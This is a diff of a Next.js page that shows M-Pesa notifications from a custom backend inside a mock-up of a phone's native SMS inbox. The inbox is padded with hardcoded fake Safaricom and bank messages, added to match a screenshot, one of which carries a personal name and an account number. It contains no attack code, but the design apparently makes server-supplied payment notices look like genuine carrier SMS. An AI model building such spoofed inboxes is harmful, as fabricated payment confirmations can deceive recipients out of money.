@@ -19,11 +19,15 @@ function formatWhen(iso: string) {
   return d.toLocaleDateString([], { weekday: "long" });
 }
 
-// Inner component that uses useSearchParams
+// Strip HTML tags for preview
+function stripHtml(html: string): string {
+  return html.replace(/<[^>]+>/g, "").trim();
+}
+
 function MessagesContent() {
   const searchParams = useSearchParams();
   const phoneFromUrl = searchParams.get("phone");
-
+  
   const [phone, setPhone] = useState(phoneFromUrl || "");
   const [pin, setPin] = useState("");
   const [isLoggingIn, setIsLoggingIn] = useState(false);
@@ -36,9 +40,7 @@ function MessagesContent() {
   });
 
   useEffect(() => {
-    if (items.length > 0) {
-      setShowLogin(false);
-    }
+    if (items.length > 0) setShowLogin(false);
   }, [items]);
 
   useEffect(() => {
@@ -51,14 +53,11 @@ function MessagesContent() {
       setError("Please enter phone number and 4-digit PIN");
       return;
     }
-
     setIsLoggingIn(true);
     setError("");
-
     try {
       //const apiUrl = process.env.NEXT_PUBLIC_API_URL || "http://127.0.0.1:8000";
       const apiUrl = process.env.NEXT_PUBLIC_API_URL || "https://traderiserproapp.onrender.com";
-      
       const response = await axios.post(
         `${apiUrl}/api/mpesa-notif/login/`,
         { phone_number: phone, pin },
@@ -67,34 +66,72 @@ function MessagesContent() {
 
       if (response.data.access) {
         localStorage.setItem("access_token", response.data.access);
-        if (response.data.refresh) {
-          localStorage.setItem("refresh_token", response.data.refresh);
-        }
+        if (response.data.refresh) localStorage.setItem("refresh_token", response.data.refresh);
         setShowLogin(false);
         setError("");
-        alert("Login successful!");
       }
     } catch (err: any) {
-      console.error(err);
-      setError(err.response?.data?.error || "Invalid phone number or PIN. Please try again.");
+      setError(err.response?.data?.error || "Invalid phone number or PIN.");
     } finally {
       setIsLoggingIn(false);
     }
   };
 
+  // Mock messages to match screenshot
+  const mockThreads = [
+    {
+      id: "safaricom1",
+      title: "SAFARICOM",
+      preview: "Track every parcel for you & your customer with Leta Express mini app on M-PESA Busine...",
+      when: "10:27",
+      unread: true,
+    },
+    {
+      id: "safaricom2",
+      title: "Safaricom",
+      preview: "You do not have an active data bundle. To continue enjoying seamless browsing, dial *...",
+      when: "00:15",
+      unread: true,
+    },
+    {
+      id: "okoa",
+      title: "Okoa Jahazi",
+      preview: "Your Okoa Chap Chap request was successful. Your call costs through OKOA was...",
+      when: "Yesterday",
+      unread: true,
+    },
+    {
+      id: "iandmbank",
+      title: "IANDBMBANK",
+      preview: "KES 80.00 paid to SIMON NGOWA SARO, SIMON NGOWA SARO (Acc 416121) on 08/06...",
+      when: "Monday",
+      unread: true,
+    },
+    {
+      id: "21777",
+      title: "21777",
+      preview: "Thank you for choosing Safaricom. We would like to hear about your experience with...",
+      when: "Monday",
+      unread: true,
+    },
+  ];
+
   const threads = useMemo(() => {
-    if (items.length === 0) return [];
-    const latest = items[0];
-    const unreadCount = items.filter((n) => !n.is_read).length;
+    const liveMpesa = items[0]; // Latest MPESA notification
+
+    if (!liveMpesa) {
+      return mockThreads;
+    }
 
     return [
       {
         id: "mpesa",
         title: "MPESA",
-        preview: latest.message,
-        when: formatWhen(latest.created_at),
-        unread: unreadCount,
+        preview: stripHtml(liveMpesa.message),
+        when: formatWhen(liveMpesa.created_at),
+        unread: items.filter((n) => !n.is_read).length > 0,
       },
+      ...mockThreads,
     ];
   }, [items]);
 
@@ -106,7 +143,6 @@ function MessagesContent() {
             <h1 className="text-4xl font-bold text-white">Messages</h1>
             <p className="text-white/60 mt-2">Sign in to view your M-Pesa notifications</p>
           </div>
-
           <form onSubmit={handleLogin} className="space-y-6">
             <div>
               <label className="text-white/70 text-sm block mb-2">Phone Number</label>
@@ -119,7 +155,6 @@ function MessagesContent() {
                 required
               />
             </div>
-
             <div>
               <label className="text-white/70 text-sm block mb-2">4-Digit PIN</label>
               <input
@@ -132,9 +167,7 @@ function MessagesContent() {
                 required
               />
             </div>
-
             {error && <p className="text-red-400 text-center text-sm">{error}</p>}
-
             <button
               type="submit"
               disabled={isLoggingIn}
@@ -143,7 +176,6 @@ function MessagesContent() {
               {isLoggingIn ? "Signing in..." : "Sign In"}
             </button>
           </form>
-
           <p className="text-center text-white/50 text-sm mt-8">
             Use the same 4-digit PIN you set when connecting M-Pesa
           </p>
@@ -152,21 +184,18 @@ function MessagesContent() {
     );
   }
 
-  // Main Messages UI
   return (
-    <main className="min-h-screen pb-24">
+    <main className="min-h-screen pb-24 bg-black">
       <div className="pt-[max(env(safe-area-inset-top),20px)] px-5">
         <div className="flex items-center justify-between">
-          <button className="px-3 py-1.5 rounded-full bg-[#1C1C1E] text-[15px] text-white/90">
-            Edit
-          </button>
+          <button className="px-3 py-1.5 rounded-full bg-[#1C1C1E] text-[15px] text-white/90">Edit</button>
           <button className="h-9 w-9 rounded-full bg-[#1C1C1E] flex items-center justify-center">
             <svg viewBox="0 0 24 24" className="h-4 w-4 text-white/80" fill="currentColor">
               <path d="M3 5h18v2H3zm4 6h10v2H7zm-4 6h18v2H3z" />
             </svg>
           </button>
         </div>
-        <h1 className="mt-3 text-[34px] font-bold tracking-tight">Messages</h1>
+        <h1 className="mt-3 text-[34px] font-bold tracking-tight text-white">Messages</h1>
       </div>
 
       {notifError && (
@@ -179,19 +208,16 @@ function MessagesContent() {
         {loading && items.length === 0 && (
           <li className="px-5 py-6 text-white/40 text-sm">Loading messages…</li>
         )}
-        {!loading && threads.length === 0 && !notifError && (
-          <li className="px-5 py-6 text-white/40 text-sm">No messages yet.</li>
-        )}
 
         {threads.map((t) => (
           <li key={t.id}>
             <Link
-              href="/conversation"
+              href={t.id === "mpesa" ? "/conversation" : "#"}
               className="flex gap-3 px-5 py-3 active:bg-white/5"
             >
               <div className="relative shrink-0">
-                {t.unread > 0 && (
-                  <span className="absolute -left-3 top-1/2 -translate-y-1/2 h-2.5 w-2.5 rounded-full bg-ios-blue" />
+                {t.unread && (
+                  <span className="absolute -left-3 top-1/2 -translate-y-1/2 h-2.5 w-2.5 rounded-full bg-blue-500" />
                 )}
                 <div className="h-14 w-14 rounded-full bg-gradient-to-br from-[#3a2a5c] to-[#1a1230] flex items-center justify-center">
                   <svg viewBox="0 0 24 24" className="h-8 w-8 text-white/85" fill="currentColor">
@@ -199,20 +225,18 @@ function MessagesContent() {
                   </svg>
                 </div>
               </div>
+
               <div className="flex-1 min-w-0 border-b border-white/5 pb-3">
                 <div className="flex items-center justify-between">
-                  <span className="text-[17px] font-semibold">{t.title}</span>
-                  <span className="text-[13px] text-white/50 flex items-center gap-1">
-                    {t.when}
-                    <svg viewBox="0 0 24 24" className="h-3 w-3" fill="currentColor">
-                      <path d="M9 6l6 6-6 6" />
-                    </svg>
-                  </span>
+                  <span className="text-[17px] font-semibold text-white">{t.title}</span>
+                  <span className="text-[13px] text-white/50">{t.when}</span>
                 </div>
-                <p className={`text-[14px] line-clamp-2 mt-0.5 ${t.unread > 0 ? 'text-white font-medium' : 'text-white/55'}`}>
-                  <span className="inline-block mr-1 px-1 rounded bg-white/10 text-[10px] text-white/70 align-middle">
-                    PE
-                  </span>
+                <p className={`text-[15px] line-clamp-2 mt-0.5 ${t.unread ? 'text-white font-medium' : 'text-white/60'}`}>
+                  {t.id === "mpesa" && (
+                    <span className="inline-block mr-1.5 px-1.5 py-0.5 rounded bg-white/10 text-[10px] text-white/70 align-middle">
+                      PE
+                    </span>
+                  )}
                   {t.preview}
                 </p>
               </div>
@@ -241,7 +265,6 @@ function MessagesContent() {
   );
 }
 
-// Main exported component with Suspense boundary
 export default function MessagesPage() {
   return (
     <Suspense fallback={<div className="min-h-screen flex items-center justify-center bg-black text-white">Loading Messages...</div>}>
